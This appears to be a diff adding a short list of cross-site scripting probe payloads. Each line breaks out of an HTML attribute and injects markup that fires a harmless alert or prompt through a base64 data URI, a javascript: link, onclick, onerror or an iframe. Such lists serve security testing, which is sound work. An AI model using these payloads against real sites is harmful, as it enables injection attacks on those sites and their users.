@@ -1,0 +1,6 @@
+"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">YOU/HAVE/XSS1</a>
+"><a href=javascript:prompt(1)>YOU/HAVE/XSS2</a>
+"><h1 onclick=prompt(1)>YOU/HAVE/XSS3</h1>
+"><img src=YOU/HAVE/XSS4 onerror=prompt(1)>
+"><iframe src= YOU/HAVE/XSS5>
+"><a href="xss">YOU/HAVE/XSS6</a>
